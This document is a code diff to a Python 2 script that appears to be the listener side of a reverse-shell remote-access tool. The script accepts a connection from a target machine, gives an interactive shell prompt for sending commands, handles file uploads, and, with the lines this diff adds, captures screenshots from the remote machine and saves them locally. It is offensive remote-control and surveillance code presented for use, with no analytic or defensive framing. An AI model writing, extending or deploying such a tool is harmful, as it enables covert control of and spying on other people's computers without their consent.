@@ -20,8 +20,10 @@ def reliable_recv():
             continue
 
 def shell():
+    global count
+
     while True:
-        command = raw_input("* Shell#~%s: " % str(ip))
+        command = raw_input("Shell~%s: " % str(ip[0]))
         reliable_send(command)
         if command == 'q':
             break
@@ -38,15 +40,24 @@ def shell():
             except:
                 failed = "Failed To Upload"
                 reliable_send(base64.b64encode(failed))
+        elif command[:10] == "screenshot":
+            with open("screenshot%d" % count, "wb") as screen:
+                image = reliable_recv()
+                image_decoded = base64.b64decode(image)
+                if image_decoded[:4] == "[!!]":
+                    print(image_decoded)
+                else:
+                    screen.write(image_decoded)
+                    count = count + 1
         else:
             result = reliable_recv()
             print(result)
 
 def server():
     global s
+    global target
     global ip
     global port
-    global target
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -57,8 +68,10 @@ def server():
     target, ip = s.accept()
     print("[+] Connection Established From: %s" % str(ip))
 
+
 ip = sys.argv[1]
 port = sys.argv[2]
+count = 1
 
 server()
 shell()
